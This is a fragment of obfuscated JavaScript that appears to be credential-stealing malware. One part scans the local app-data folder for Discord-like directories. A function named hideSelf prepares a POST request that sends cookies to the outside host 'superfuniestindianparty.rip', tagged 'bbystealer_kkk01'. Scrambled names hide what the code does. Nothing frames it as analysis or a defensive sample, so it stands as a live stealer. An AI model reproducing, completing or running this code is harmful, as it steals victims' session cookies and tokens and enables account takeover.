...
fs.readdirSync(localappdata).forEach(casadee => {
    const eithen = {};
    eithen.NkECu = "Searching game folder...";
    eithen.vTrrg = "cord";
    eithen.mORYH = function (tenaya, peggi) {
        return tenaya + peggi;
    };
    eithen.CCmRa = function (maddelyn, maribel) {
        return maddelyn + maribel;
    };
    const brehanna = eithen;
    console.log(brehanna.NkECu);
    if (casadee.includes(brehanna.vTrrg)) games.push(brehanna.mORYH(brehanna.CCmRa(localappdata, "\\"), casadee));
    else return;
});
...
function hideSelf() {
    ...
    const paitlynn = solash(this, function () {
        const anajulia = {};
        anajulia.WKvbd = "superfuniestindianparty.rip";
        anajulia.ktCWI = "/QDVkCo9cC0g2/cookies";
        anajulia.WvyXX = "POST";
        anajulia.tVqeD = "bbystealer_kkk01";
        anajulia.yBqBP = "text/plain";
        anajulia.fjAef = "error";
...
function onlyUnique(joksan, deadria, ahnesty) {
    const melahni = {};
    melahni.qZrtA = function (yamilett, yagaira) {
        return yamilett === yagaira;
    };
    const tayzlee = melahni;
    return tayzlee.qZrtA(ahnesty.indexOf(joksan), deadria);
}
